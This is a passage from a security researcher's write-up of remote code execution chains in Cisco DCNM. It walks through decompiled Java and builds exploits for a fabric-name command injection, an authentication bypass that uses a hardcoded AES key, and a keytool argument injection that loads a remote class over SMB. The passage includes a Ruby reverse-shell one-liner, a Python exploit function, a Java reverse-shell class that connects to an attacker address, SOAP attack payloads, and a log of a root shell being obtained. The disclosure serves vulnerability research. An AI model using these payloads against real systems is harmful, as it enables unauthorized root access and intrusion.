/*  88 */     StatusCode ret = StatusCode.InvalidRequest;
/*  89 */     if (RestHelper.isEmpty(this.name) || this.name.contains(" ")) {
/*  90 */       ret.setExtra("Invalid fabric name. Fabric name cannot be empty and cannot contain space.");
/*  91 */       return ret;
/*     */     } 
/*  93 */     if (this.generalSetting != null) {
/*  94 */       ret = this.generalSetting.validate();
/*     */     } else {
/*  96 */       this.generalSetting = new GeneralSetting();
/*     */     } 
/*  98 */     if (ret != StatusCode.Success) {
/*  99 */       return ret;
/*     */     }
/* 101 */     GeneralSetting.ProvisionOption provisionOption = this.generalSetting.getProvisionOption();
/* 102 */     if (provisionOption == GeneralSetting.ProvisionOption.DCNMTopDown) {
/* 103 */       ret = validateTopDownFabricProvisionSetting();
/*     */     }
/* 105 */     else if (this.provisionSetting != null) {
/* 106 */       ret = this.provisionSetting.validate();
/*     */     } else {
/* 108 */       this.provisionSetting = new ProvisionSetting(this.name);
/*     */     } 
/*     */     
/* 111 */     if (ret != StatusCode.Success) {
/* 112 */       return ret;
/*     */     }
/* 114 */     if (this.poolSetting != null) {
/* 115 */       ret = this.poolSetting.validate();
/*     */     } else {
/* 117 */       this.poolSetting = new PoolSetting();
/*     */     } 
/* 119 */     if (ret != StatusCode.Success) {
/* 120 */       return ret;
/*     */     }
/* 122 */     if (this.borderSetting == null) {
/* 123 */       this.borderSetting = new BorderSetting();
/*     */     }
/* 125 */     return StatusCode.Success;
/*     */   }
```

Upon many things to validate, line *[89]* checks to ensure is that we have no spaces in the `name` property. This will become important later.

```java
/*  150 */       if (ret != StatusCode.Success) {
/*  151 */         this.log.error("Error creating LAN fabric due to validation error." + ret.getDetail());
/*  152 */       } else if (fabricExists(fabricName)) {
/*  153 */         ret = StatusCode.InvalidRequest;
/*  154 */         ret.setExtra("The LAN fabric with the same name exists.");
/*      */       
/*      */       }
/*      */       else {
/*      */         
/*  159 */         ret = this.mgr.addFabric(fabric);
/*  160 */         if (ret == StatusCode.Success) {
/*  161 */           if (FabricPoolMgr.createFabricPools(fabric)) {
/*  162 */             sendNotification("create", "cisco.dcnm.event.lan-fabric", "success", fabricName, false);
/*      */           } else {
/*  164 */             ret.setExtra("Error creating pool for LAN fabric " + fabricName);
/*      */           } 
/*      */         }
/*      */         
/*  168 */         if (ret != StatusCode.Success);
/*      */       
/*      */       }
/*      */     
/*      */     }
/*  173 */     catch (Exception ex) {
/*  174 */       ex.printStackTrace();
/*      */     } 
/*      */ 
/*      */     
/*  178 */     RestHelper.logMesasge(this.log, ret, "Impl: Created fabric " + fabricName);
/*  179 */     if (ret == StatusCode.Success) {
/*      */       
/*      */       try {
/*  182 */         DhcpSetting dhcpSetting = (fabric.getProvisionSetting() != null) ? fabric.getProvisionSetting().getDhcpSetting() : null;
/*  183 */         String primaryDns = null, secondaryDns = null, primarySubnet = null;
/*  184 */         if (dhcpSetting != null) {
/*  185 */           primaryDns = dhcpSetting.getPrimaryDNS();
/*  186 */           secondaryDns = dhcpSetting.getSecondaryDNS();
/*  187 */           primarySubnet = dhcpSetting.getPrimarySubnet();
/*      */         } 
/*  189 */         DhcpAutoconfigImpl dhcpImpl = new DhcpAutoconfigImpl(fabricName);                            // 6
```

Back inside of `LanFabricImpl.createLanFabric` at line *[152]* we need to make sure the controlled `fabricName` hasn't been created before hand (the code just uses a hashmap lookup).

Then at line *[179]* we can enter the branch if we successfully call `addFabric` on line *[159]*. Then at *[189]* the code calls a new instance of the `com.cisco.dcbu.vinci.dhcp.handler.DhcpAutoconfigImpl` class with our controlled `fabricName` string. Let's take a quick look at the constructor for that class.

```java
/*   52 */   public DhcpAutoconfigImpl(String fabricname) { 
/*      */     this.dhcpConfig = "/var/lib/dcnm/dcnm-dfa.conf"; 
/*      */     this.dhcpConfigBkp = "/var/lib/dcnm/golden-dcnm-dfa.conf";
/*      */     this.REPLACE_GOLDEN_FILE = "mv -f /var/lib/dcnm/golden-dcnm-dfa.conf /var/lib/dcnm/dcnm-dfa.conf";
/*   54 */     this.fabric = null;
/*   55 */     this.sharednetwork = "dcnm";
/*   56 */     this.convertedValue = null;
/*      */ 
/*      */     
/*   59 */     this.fabric = fabricname;
/*   60 */     if (!RestHelper.isDefaultLan(fabricname)) {
/*   61 */       this.dhcpConfig = "/var/lib/dcnm/" + this.fabric + "-dfa.conf";
/*   62 */       this.dhcpConfigBkp = "/var/lib/dcnm/golden" + this.fabric + "-dfa.conf";
/*   63 */       this.REPLACE_GOLDEN_FILE = "mv -f " + this.dhcpConfigBkp + " " + this.dhcpConfig;
/*   64 */       this.sharednetwork = this.fabric;
/*      */     }
```

What this code reveals is that we can inject into the `this.dhcpConfig` variable:

```java
/*   69 */   public String getFabricDhcpConfigFileName() { return this.dhcpConfig; }
```

Continuing inside of `LanFabricImpl.createLanFabric` we can see the rest of the code:

```java
/*  190 */         String fabricDhcpFileName = dhcpImpl.getFabricDhcpConfigFileName();
/*      */ 
/*      */ 
/*      */ 
/*      */ 
/*      */         
/*  196 */         dhcpImpl.updatePrimarySubent(primarySubnet, primaryDns, secondaryDns);
/*      */ 
/*      */         
/*  199 */         String helpScriptFileName = getHelpScriptFileName();
/*  200 */         FileWriter writer = new FileWriter(helpScriptFileName, true);
/*  201 */         BufferedWriter bufferedWriter = new BufferedWriter(writer);
/*  202 */         bufferedWriter.write("#!/bin/sh");
/*  203 */         bufferedWriter.newLine();
/*  204 */         bufferedWriter.write(String.format("sed -i '/dcnm-dfa.conf/a include \"%s\";' %s;\n", new Object[] { fabricDhcpFileName, DhcpAutoconfigImpl.getDhcpConfigFileName() }));  // 9
/*  205 */         bufferedWriter.close();
/*  206 */         Runtime.getRuntime().exec("sh " + helpScriptFileName);
/*  207 */         Runtime.getRuntime().exec("rm -rf " + helpScriptFileName);
```

Now when the `com.cisco.dcbu.vinci.dhcp.handler.DhcpAutoconfigImpl.getFabricDhcpConfigFileName` method is called on line *[190]*, we can return an injected string into `fabricDhcpFileName`. **This injected string must not contain spaces in order to survive previous checks**.

At line *[196]* we need to survive this call to `DhcpAutoconfigImpl.updatePrimarySubent`, so to ensure that I set the `primarySubnet`, `primaryDns` and `secondaryDns` variables to `127.0.0.1` (all valid ipv4 addresses).

Then at line *[204]* the code uses our injected `fabricDhcpFileName` when dynamically creating a shell script and then later at line *[206]* it is executed.

To exploit this, I used ruby with [bash brace expansion](https://www.gnu.org/software/bash/manual/html_node/Brace-Expansion.html) since I was not able to have spaces. Ruby is installed by default on the appliance and allowed me to craft a reverse shell in code that had no spaces.

```rb
c=TCPSocket.new("127.0.0.1","1337");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print(io.read)}end
```

Below is the `pop_a_root_shell` method from my exploit that shows the layered entity bean that I crafted in json.

```py
def pop_a_root_shell(t, ls, lp):
    """ get dat shell! """
    handlerthr = Thread(target=handler, args=(lp,))
    handlerthr.start()
    uri = "https://%s/rest/fabrics" % t
    cmdi  = "%s\";'`{ruby,-rsocket,-e'c=TCPSocket.new(\"%s\",\"%d\");" % (random_string(), ls, lp)
    cmdi += "while(cmd=c.gets);IO.popen(cmd,\"r\"){|io|c.print(io.read)}end'}`'\""
    j = { 
        "name" : cmdi,
        "generalSetting" : {
            "asn" : "1337",
            "provisionOption" : "Manual"
        }, 
        "provisionSetting" : {
            "dhcpSetting": {
                "primarySubnet" : "127.0.0.1",
                "primaryDNS" : "127.0.0.1",
                "secondaryDNS" : "127.0.0.1"
            },
            "ldapSetting" : {
                "server" : "127.0.0.1"
            },
            "amqpSetting" : {
                "server" : "127.0.0.1:1337"
            }
        }
    }
    c = { "resttoken": resttoken }
    r = requests.post(uri, json=j, cookies=c, verify=False)
    if r.status_code == 200 and ls in r.text:
        return True
    return False
```

Chaining everything together, we can achieve unauthenticated remote code execution as root!

```
saturn:~ mr_me$ ./poc.py 
(+) usage: ./poc.py <target> <connectback:port>
(+) eg: ./poc.py 192.168.100.123 192.168.100.59
(+) eg: ./poc.py 192.168.100.123 192.168.100.59:1337

saturn:~ mr_me$ ./poc.py 192.168.100.123 192.168.100.59:1337
(+) leaked user: root
(+) leaked pass: Dcnmpass123
(+) leaked vfs path: temp18206a94b7c45072/content-85ba056e1faec012
(+) created a root session!
(+) starting handler on port 1337
(+) connection from 192.168.100.123
(+) pop thy shell!
id
uid=0(root) gid=0(root) groups=0(root)
uname -a
Linux localhost 3.10.0-957.10.1.el7.x86_64 #1 SMP Mon Mar 18 15:06:45 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux
```

You can [download](/pocs/cve-2019-15977.py.txt) the exploit and test it for yourself.
[ret2toc](#table-of-contents)

## RCE Chain 3

Vulnerable Targets:
- Installer for Windows (dcnm-installer-x64-windows.11.2.1.exe.zip)

### TrustedClientTokenValidator Authentication Bypass Vulnerability

Inside of the Fabric Manager (FM) web application directory, we can find the `web.xml` that contains the servlet mappings for the application.

```xml
<servlet>
    <servlet-name>restEasyServlet</servlet-name>
    <servlet-class>org.jboss.resteasy.plugins.server.servlet.HttpServletDispatcher</servlet-class>
</servlet>

<servlet-mapping>
    <servlet-name>restEasyServlet</servlet-name>
    <url-pattern>/fmrest/*</url-pattern>
</servlet-mapping> 

<context-param>
    <param-name>resteasy.providers</param-name>
    <param-value>com.cisco.dcbu.web.client.rest.RestSecurityInterceptor</param-value>
</context-param>
```

A number of resteasy providers are also registered and the most interesting of them is the `com.cisco.dcbu.web.client.rest.RestSecurityInterceptor` interceptor.

```java
/*     */ @Provider
/*     */ @ServerInterceptor
/*     */ @ClientInterceptor
/*     */ @Precedence("SECURITY")
/*     */ public class RestSecurityInterceptor
/*     */   implements ContainerRequestFilter
/*     */ {
/*     */   @Context
/*     */   HttpServletRequest servletRequest;
/*     */   @Context
/*     */   ResourceInfo resourceInfo;
/*     */   private static final String HTTP_POST_METHOD = "POST";
/*     */   private static final String HTTP_GET_METHOD = "GET";
/*  82 */   private static final String[] BY_PASS_PAGES = { "/dcnm/auth", "/dcnm/role", "/about", "/about/version", "/epl/getKibanaConfig", "/security/apptoken/create", "/dcnm/newauth" };
/*     */   
/*     */   public void filter(ContainerRequestContext requestContext) {
/*  85 */     ServerResponse response = null;
/*  86 */     Method method = this.resourceInfo.getResourceMethod();
/*     */ 
/*     */     
/*  89 */     if (!ReferrerValidator.isReferrerValid(this.servletRequest)) {
/*  90 */       response = new ServerResponse("Invalid Referrer.", 403, new Headers());
/*     */     } else {
/*     */ 
/*     */       
/*     */       try {
/*  95 */         doTokenValidation(requestContext, method);
/*     */ 
/*     */         // ...
/*     */   }
```

The precedence is set to *SECURITY* which means this interceptor will be executed first before any other interceptor. For reference, here is the order of precedence:

1. SECURITY
2. HEADER_DECORATOR
3. ENCODER
4. REDIRECT
5. DECODER

At line *[95]* we can see a call to `RestSecurityInterceptor.doTokenValidation` using the `ContainerRequestContext` instance. This is literally an [Interface API](https://docs.oracle.com/javaee/7/api/javax/ws/rs/container/ContainerRequestContext.html) for the complete HTTP request.

```java
/*     */   private void doTokenValidation(ContainerRequestContext requestContext, Method method) throws AuthenticationException {
/* 219 */     if (bypass(requestContext))
/*     */       return; 
/* 221 */     String token = null;
/* 222 */     String afwToken = null;
/*     */     
/* 224 */     String appToken = HttpRequestDataProvider.getAppToken(this.servletRequest);
/* 225 */     if (appToken != null)
/*     */     
/*     */     { try {
/* 228 */         token = AfwTokenValidator.validateRequest(this.servletRequest, true);
/* 229 */       } catch (Exception e) {
/* 230 */         throw new AuthenticationException("Token failed the authentication due to " + e.getMessage());
/*     */       }  }
/* 232 */     else { if ((afwToken = getAfwToken()) != null && TrustedClientTokenValidator.isValid(afwToken)) {
/*     */ 
/*     */ 
/*     */         
/* 236 */         AfwSecurityLogger.info("API invoked by a trusted client.");
/*     */ 
/*     */         
/*     */         return;
/*     */       } 
/*     */ 
/*     */       
/* 243 */       if (isBlank(token = getTokenFromHeader()) && 
/* 244 */         isBlank(token = getTokenFromQueryString()) && 
/* 245 */         isBlank(token = getTokenFromCookie(requestContext))) {
/*     */         
/* 247 */         if (validAppToken(method))
/*     */           return; 
/* 249 */         throw new AuthenticationException("Token is missing from the request.");
/*     */       }  }
/* 251 */      if (!authenticateToken(token)) {
/* 252 */       throw new AuthenticationException("Token failed the authentication");
/*     */     }
/*     */ 
/*     */     
/* 256 */     setToken(token);
/*     */   }
```

On line *[219]* we can't just return from the call on `RestSecurityInterceptor.bypass` because that method contains equality checks and not indexing checks.

```java
/*     */   private boolean bypass(ContainerRequestContext requestContext) {
/* 379 */     String restPath = requestContext.getUriInfo().getPath();
/*     */     
/* 381 */     for (String bypassStr : BY_PASS_PAGES) {
/* 382 */       if (restPath.equals(bypassStr)) {
/* 383 */         return true;
/*     */       }
/*     */     } 
/* 386 */     return false;
/*     */   }
```

Our goal is to reach a `return;` statement in `RestSecurityInterceptor.doTokenValidation`, so setting the `appToken` variable at line *[224]* to the value from the `afw-app-token` HTTP header in our request is *NOT* going to achieve that.

Continuing on, there is a call to `RestSecurityInterceptor.getAfwToken` at line *[232]* in the else block that is attempting to set the `afwToken` variable.

```java
/*     */   private String getAfwToken() {
/* 348 */     String token = null;
/* 349 */     if (!isBlank(token = this.servletRequest.getHeader("afw-token"))) {
/* 350 */       return token;
/*     */     }
/* 352 */     return null;
/*     */   }
```

We can set the `afwToken` to be a controlled value from the request using the `afw-token` HTTP header. Now let's investigate the `TrustedClientTokenValidator.isValid` static method.

```java
/*    */ public class TrustedClientTokenValidator
/*    */ {
/*    */   private static final String KEY = "s91zEQmb305F!90a";
/*    */   private static final int TIME_TILL_VALID = 15000;
/* 51 */   private static final Log log = LogFactory.getLog("fms.security");
/*    */ 
/*    */   
/*    */   private static Cipher cipher;
/*    */ 
/*    */ 
/*    */   
/*    */   static  {
/*    */     try {
/* 60 */       iv = new IvParameterSpec(new byte[16]);
/* 61 */       SecretKeySpec skeySpec = new SecretKeySpec("s91zEQmb305F!90a".getBytes("UTF-8"), "AES");
/* 62 */       cipher = Cipher.getInstance("AES/CBC/PKCS5PADDING");
/* 63 */       cipher.init(2, skeySpec, iv);
/* 64 */     } catch (Exception e) {
/* 65 */       log.error(e);
/*    */     } 
/*    */   }
/*    */ 
/*    */ 
/*    */ 
/*    */ 
/*    */ 
/*    */ 
/*    */ 
/*    */   
/*    */   public static boolean isValid(String token) {
/*    */     try {
/* 78 */       byte[] decryptedText = cipher.doFinal(Base64.getDecoder().decode(token));
/* 79 */       byte[] last10Bytes = new byte[10];
/* 80 */       System.arraycopy(decryptedText, decryptedText.length - 10, last10Bytes, 0, 10);
/*    */       
/* 82 */       long userSuppliedTime = Long.parseLong(new String(last10Bytes)) * 1000L;
/* 83 */       long now = System.currentTimeMillis();
/* 84 */       long lowerBound = now - 15000L;
/*    */       
/* 86 */       return (userSuppliedTime >= lowerBound && userSuppliedTime <= now);
/* 87 */     } catch (Exception ex) {
/* 88 */       log.error(ex);
/*    */ 
/*    */       
/* 91 */       return false;
/*    */     } 
/*    */   }
/*    */ }
```

The `com.cisco.dcbu.lib.afw.TrustedClientTokenValidator` class sets up a static initializer with an initialized `Cipher` instance using a hardcoded key `s91zEQmb305F!90a`. When the `TrustedClientTokenValidator.isValid` method is called, the code attempts to base64 decode the provided token and decrypt it using the static key.

This is stored into a byte array and the last 10 bytes are extracted and parsed as a Long. A `lowerBound` Long value is created from the current time in milliseconds -15 seconds. If we supply a value that is greater than the `lowerBound` but less than the current time then we can return `true` and subsequently return from `RestSecurityInterceptor.doTokenValidation` safely.

Once we return out of `RestSecurityInterceptor.doTokenValidation` we are still faced with another hurdle on line *[99]* which is the call to `IdentityManager.isAdmin`.

```java
/*  98 */         if (method.isAnnotationPresent(com.cisco.dcbu.sm.common.annotation.AdminAccess.class) && 
/*  99 */           !IdentityManager.getInstance().isAdmin())
/*     */         {
/*     */           
/* 102 */           response = new ServerResponse("Access denied", 403, new Headers());
/*     */         }
/*     */ 
/*     */ 
/*     */         
/* 107 */         if (requestContext.getMethod().equals("POST")) {
/* 108 */           processPostData(requestContext);
/* 109 */         } else if (requestContext.getMethod().equals("GET")) {
/* 110 */           processGetData(requestContext);
/*     */         } 
/* 112 */       } catch (AuthenticationException auEx) {
/* 113 */         auEx.printStackTrace();
/* 114 */         response = new ServerResponse("Failed to access to the server", 401, new Headers());
/* 115 */       } catch (Exception ex) {
/* 116 */         ex.printStackTrace();
/* 117 */         response = new ServerResponse("Illegal access to the server", 401, new Headers());
/*     */       } 
/*     */     } 
/*     */     
/* 121 */     if (response != null) {
/* 122 */       requestContext.abortWith(response);
/*     */     }
```

If we set the `response` variable, it's game over for us because on line *[121]* there is a check for a non null `response` and if its set, the code will abort and not let our HTTP request through.

#### The Rabbit Hole Goes Deeper

Admittedly, when I initially developed the poc for this bug, I sometimes didn't set the `response` variable at all and I had no idea why, so I was bypassing authentication when I shouldn't be. In other cases I as hitting line *[102]* and setting the response to a 403 *Access denied*.

I verified this by setting a breakpoint after the `IdentityManager.isAdmin` method call check.

![response is null after performing the IdentityManager.isAdmin method call check](/assets/images/busting-ciscos-beans/response-null.png "response is null after performing the IdentityManager.isAdmin method call check") 

Let's dive into the `IdentityManager.isAdmin` method:

```java
/*     */   public boolean isAdmin() {
/* 159 */     boolean isAdmin = false;
/* 160 */     if (SecurityHandler.getToken() != null) {
/* 161 */       FMUserBase user = extractToken(SecurityHandler.getToken());
/* 162 */       if (user != null && UserRoles.INSTANCE.isAdmin(user.getRoles())) {
/* 163 */         isAdmin = true;
/*     */       }
/*     */     } 
/* 166 */     return isAdmin;
/*     */   }
```

Inside of the `SecurityHandler` class.

```java
/*     */ public class SecurityHandler
/*     */   extends GenericSOAPHandler
/*     */ {
/*     */
/*     */   // ...
/*     */
/*  67 */   private static InheritableThreadLocal<String> tkn = new InheritableThreadLocal();
/*  68 */   private static InheritableThreadLocal<String> sessId = new InheritableThreadLocal();
/*     */
/*     */   // ...
/*     */
/* 206 */   public static String getToken() { return (String)tkn.get(); }
```

Somehow still, `SecurityHandler.getToken` was returning a non null value?

![I'm an admin when I shouldn't be](/assets/images/busting-ciscos-beans/isadmin.png "I'm an admin when I shouldn't be") 

I noticed that the role was set to `network-admin`, which is not what I sent in my payload, rather I sent `global-admin`. So where is `network-admin` coming from? The `SecurityHandler.tkn` variable is an instance of the `java.lang.InheritableThreadLocal` class.

The hint is in the class name, `InheritableThreadLocal`. This class inherits the `get` method from the superclass `ThreadLocal`. It obtains an instance of `ThreadLocalMap` at *[1]* which was created with the constructor at *[2]*. It then sets values by calling `childValue` which is getting the value from the parent thread at *[5]* and assigning it to the child thread.

```java
public class ThreadLocal<T> {

    // ...

    public T get() {
        Thread t = Thread.currentThread();
        ThreadLocalMap map = getMap(t);                                         // 1
        if (map != null) {
            ThreadLocalMap.Entry e = map.getEntry(this);
            if (e != null) {
                @SuppressWarnings("unchecked")
                T result = (T)e.value;
                return result;
            }
        }
        return setInitialValue();
    }
```

```java
    static class ThreadLocalMap {

        static class Entry extends WeakReference<ThreadLocal<?>> {
            /** The value associated with this ThreadLocal. */
            Object value;

            Entry(ThreadLocal<?> k, Object v) {
                super(k);
                value = v;
            }
        }

        // ...

        private ThreadLocalMap(ThreadLocalMap parentMap) {                      // 2
            Entry[] parentTable = parentMap.table;
            int len = parentTable.length;
            setThreshold(len);
            table = new Entry[len];

            for (int j = 0; j < len; j++) {
                Entry e = parentTable[j];    // entries are coming from the parent ThreadLocalMap
                if (e != null) {
                    @SuppressWarnings("unchecked")
                    ThreadLocal<Object> key = (ThreadLocal<Object>) e.get();
                    if (key != null) {
                        Object value = key.childValue(e.value);                 // 3
                        Entry c = new Entry(key, value);
                        int h = key.threadLocalHashCode & (len - 1);
                        while (table[h] != null)
                            h = nextIndex(h, len);
                        table[h] = c;
                        size++;
                    }
                }
            }
        }


```

```java
public class InheritableThreadLocal<T> extends ThreadLocal<T> {

    protected T childValue(T parentValue) {
        return parentValue;                                                     // 5
    }
```

This copying of values from the parent thread to the child is known as a [*shallow copy*](https://stackoverflow.com/a/1175667), which is just a copy on reference and is a [known weakness](https://zhangyuhui.blog/2018/01/12/leak-issue-of-inheritablethreadlocal-and-how-to-fix-it/) in the java Runtime. So the code is actually calling `IdentityManager.extractToken` on a legitimate administrative token that was leaked from the parent thread!

![Bypassing TrustedClientTokenValidator.isValid and (ab)using a design flaw in Java Runtime to bypass authentication](/assets/images/busting-ciscos-beans/isValid-ab-1.png "Bypassing TrustedClientTokenValidator.isValid and (ab)using a design flaw in Java Runtime to bypass authentication") 

![A wild hacker appears!](/assets/images/busting-ciscos-beans/isValid-ab-2.png "A wild hacker appears!") 

[ret2toc](#table-of-contents)

### SanWS importTS Command Injection Remote Code Execution Vulnerability

Inside of the `com.cisco.dcbu.jaxws.san.ep.SanWS` class we can find the definition of the `importTS` web service method:

```java
/*       */ @Remote({SanSEI.class})
/*       */ @SOAPBinding(style = SOAPBinding.Style.RPC, use = SOAPBinding.Use.LITERAL)
/*       */ @HandlerChain(file = "../../ep/fms-jaxws-handlers.xml")
/*       */ @WebContext(contextRoot = "/SanWSService", urlPattern = "/SanWS")
/*       */ @WebService(name = "San", serviceName = "SanService", endpointInterface = "com.cisco.dcbu.jaxws.san.ep.SanSEI")
/*       */ @TransactionAttribute(TransactionAttributeType.NEVER)
/*       */ @Stateless
/*       */ public class SanWS
/*       */   implements SanSEI
/*       */ {
/*       */
/*       */   //...
/*       */
/*       */   @WebMethod(operationName = "importTS")
/*       */   @WebResult(name = "result", partName = "result")
/*       */   public CallResultDO importTS(String certFile, String serverIPAddress) {
/* 10893 */     String keytool = System.getProperty("java.home") + File.separator + "bin" + File.separator + "keytool";
/*       */ 
/*       */ 
/*       */     
/* 10897 */     String trustStore = ClientCache.getJBossHome() + File.separator + "server" + File.separator + "fm" + File.separator + "conf" + File.separator + "fmtrust.jks";
/*       */ 
/*       */ 
/*       */ 
/*       */ 
/*       */ 
/*       */ 
/*       */ 
/*       */ 
/*       */ 
/*       */     
/* 10908 */     String cmd = "\"" + keytool + "\"  -importcert -trustcacerts -keystore \"" + trustStore + "\" -file \"" + certFile + "\"";
/*       */ 
/*       */     
/*       */     try {
/* 10912 */       int rc = Runtime.getRuntime().exec(cmd).waitFor();        // 1
/*       */       
/* 10914 */       if (rc != 0) {
/* 10915 */         System.out.println("Here");
/*       */       }
/* 10917 */     } catch (Exception ex) {
/* 10918 */       System.out.println("here");
/*       */     } 
/* 10920 */     return new CallResultDO();
/*       */   }
```

We can see at line *[10908]* that a string called `cmd` is built using the `certFile` string from an attacker supplied SOAP parameter. At line *[10912]* the `cmd` string is used in a call to `Runtime.getRuntime().exec()` thus, triggering command injection!

The complete command for the injection looks like this: `C:\Program Files\Cisco Systems\dcm\java\jre1.8\bin\keytool.exe -importcert -trustcacerts -keystore C:\Program Files\Cisco Systems\dcm\fm\conf\cert\fmtrust.jks -file <attacker controlled>`

If you have ever tried to exploit command injection in Java via `Runtime.getRuntime().exec()` API, you will know that you are limited to the binary being executed.

So for example if the injection was in `cmd.exe` like this: `cmd.exe /c "C:\Program Files\Cisco Systems\dcm\java\jre1.8\bin\keytool.exe -importcert -trustcacerts -keystore C:\Program Files\Cisco Systems\dcm\fm\conf\cert\fmtrust.jks -file <attacker controlled>"` then we could have just done `&&calc.exe` and call it a day.

But we are in the context of `keytool.exe`, so we can really only inject into *its* arguments. As it [turns out](https://docs.oracle.com/en/java/javase/11/tools/keytool.html), we can use the `providerclass` and `providerpath` arguments to load a remote Java class from an SMB share and gain remote code execution! All we need to do is have some code inside of the provided classes static initializer.

```java
import java.io.*;
public class Si{
    static{
        try{
            Runtime rt = Runtime.getRuntime();
            Process proc = rt.exec("calc");
        }catch (IOException e){}
    }
}
```

Keep in mind, our target uses version *Java 1.8u201* so we need to compile the class with the same major version! Once we have done that, we can login to the `/LogonWSService/LogonWS` endpoint with the backdoor account we created from our [authentication bypass](#trustedclienttokenvalidator-authentication-bypass-vulnerability).

```xml
<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:ep="http://ep.jaxws.dcbu.cisco.com/">
   <soapenv:Header/>
   <soapenv:Body>
      <ep:requestToken>
         <username>hacker</username>
         <password>Hacked123</password>
         <expiration>100000</expiration>
      </ep:requestToken>
   </soapenv:Body>
</soapenv:Envelope>
```

The server responds with a token.

```xml
<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"><soap:Body><ns1:requestTokenResponse xmlns:ns1="http://ep.jaxws.dcbu.cisco.com/"><return>xWPX64FmO4F4AfCSjjV1U5kwTMgS3OTgkjf8829Bi+o=</return></ns1:requestTokenResponse></soap:Body></soap:Envelope>
```

Now we can trigger the remote class load via the command injection and gain remote code execution!

```xml
<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:ep="http://ep.san.jaxws.dcbu.cisco.com/">
    <SOAP-ENV:Header xmlns:SOAP-ENV="http://schemas.xmlsoap.org/soap/envelope/" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">
        <m:token xmlns:m="http://ep.jaxws.dcbu.cisco.com/">xWPX64FmO4F4AfCSjjV1U5kwTMgS3OTgkjf8829Bi+o=</m:token>
    </SOAP-ENV:Header>
   <soapenv:Body>
      <ep:importTS>
         <certFile>" -providerclass Si -providerpath "\\vmware-host\Shared Folders\tools</certFile>
         <serverIPAddress></serverIPAddress>
      </ep:importTS>
   </soapenv:Body>
</soapenv:Envelope>
```

In the below example, `Si.java` was a reverse shell.

```java
import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;
import java.net.Socket;

public class Si {
    static{
        try {
            String host = "192.168.100.159";
            int port = 1337;
            String cmd = "cmd.exe";
            Process p = new ProcessBuilder(cmd).redirectErrorStream(true).start();
            Socket s = new Socket(host,port);
            InputStream pi = p.getInputStream(), pe = p.getErrorStream(), si = s.getInputStream();
            OutputStream po = p.getOutputStream(), so = s.getOutputStream();
            while(!s.isClosed()){
                while(pi.available()>0){
                    so.write(pi.read());
                }
                while(pe.available()>0){
                    so.write(pe.read());
                }
                while(si.available()>0){
                    po.write(si.read());
                }
                so.flush();
                po.flush();
                Thread.sleep(50);
                try {
                    p.exitValue();
                    break;
                }catch (Exception e){}
            }
            p.destroy();
            s.close();
        }catch (IOException | InterruptedException e){ }
    }
}
```

![Loading remote java classes and gaining remote code execution](/assets/images/busting-ciscos-beans/keytool-cmdi.png "Loading remote java classes and gaining remote code execution")

You can [download](/pocs/cve-2019-15975.py.txt) the exploit and test it for yourself. You will need an SMB server that is hosting the `Si.class` file.
[ret2toc](#table-of-contents)

## SQLi2RCE Primitives

These are the remote code execution primitives I used to chain with arbitrary sql execution vulnerabilities. These primitives take advantage of the assumed trust that the application code had with the database.

Each of these primitives is a second order vector without the first order injection - meaning that the insertion stage of data injection was filtered for malicious input enough to prevent direct remote code execution. Still, these primitives are violating a trust boundary and are technically considered vulnerabilities but I really couldn't be bothered making the case to Cisco at the time.

### Primitive 1 - Directory Traversal File Write

Vulnerable Targets:
- Installer for Windows (dcnm-installer-x64-windows.11.2.1.exe.zip)
- ISO Virtual Appliance for VMWare (dcnm-va.11.2.1.iso.zip)

Inside of the `com.cisco.dcbu.jaxws.san.ep.ReportWS` class, we can see the following web service method.

```java
/*     */   @WebMethod
/*     */   public ReportAttributeDO[] openReportTemplate(String reportTemplateName, String userName) throws SanServiceException, InvalidArgumentException {
/*     */     try {
/* 402 */       if (reportTemplateName == null || userName == null) throw new InvalidArgumentException(); 
/* 403 */       ArrayList<ReportAttribute> reportAttrs = ReportUtil.getInstance().openReportTemplate(reportTemplateName, userName);
/* 404 */       ReportAttributeDO[] attrArray = new ReportAttributeDO[reportAttrs.size()];
/* 405 */       for (int i = 0; i < reportAttrs.size(); i++) {
/* 406 */         attrArray[i] = new ReportAttributeDO((ReportAttribute)reportAttrs.get(i));
/*     */       }
/* 408 */       return attrArray;
/* 409 */     } catch (InvalidArgumentException e) {
/* 410 */       logger.warn("SanWS caught exception in deleteReportTemplate():", e);
/* 411 */       throw e;
/* 412 */     } catch (Throwable e) {
/* 413 */       logger.warn("SanWS caught exception in deleteReportTemplate():", e);
/* 414 */       throw new SanServiceException("Cannot deleteReportTemplate:" + userName, e);
/*     */     } 
/*     */   }
```

This method can also be reached from the `com.cisco.dcbu.web.client.rest.ReportRest` class on line *[877]* which is a default registered class for Fabric Manager REST interface.

```java
/*     */   @GET
/*     */   @Path("reporttemplateopen")
/*     */   @Produces({"application/json"})
/*     */   public ReportAttributeDO[] getReportTemplateOpen(@Context UriInfo info) {
/* 872 */     ServerResponse rsp = null;
/*     */     try {
/* 874 */       String tplName = RestUtil.getParameter(info, "tplName");
/* 875 */       String userName = RestUtil.getParameter(info, "userName");
/* 876 */       ReportSEI rpt = EjbRegistry.getInstance().getReportIntf();
/* 877 */       return rpt.openReportTemplate(tplName, userName);
/* 878 */     } catch (Exception ex) {
/* 879 */       this._Log.warn(ex.getMessage(), ex);
/*     */       
/* 881 */       return null;
/*     */     } 
/*     */   }
```

The method calls `ReportUtil.openReportTemplate` on line *[403]* with our controlled `tplName` (or `reportTemplateName`) and `userName`.

```java
/*      */   public ArrayList<ReportAttribute> openReportTemplate(String reportTemplateName, String userName) {
/*  707 */     ArrayList<ReportAttribute> reportAttributeList = new ArrayList<ReportAttribute>();
/*      */     try {
/*  709 */       File file2Read = new File(_FullReportDir + File.separator + userName + File.separator + "custom" + File.separator + reportTemplateName);
/*      */ 
/*      */ 
/*      */ 
/*      */       
/*  714 */       PersistentHelper.getHelper().retrieveFile(reportTemplateName, file2Read, userName);
```

The code builds a path at line *[709]* to the controlled `reportTemplateName` parameter which can contain directory traversals. Then at line *[714]* the code calls `PersistentHelper.retrieveFile` with all three (3) parameters controlled.

```java
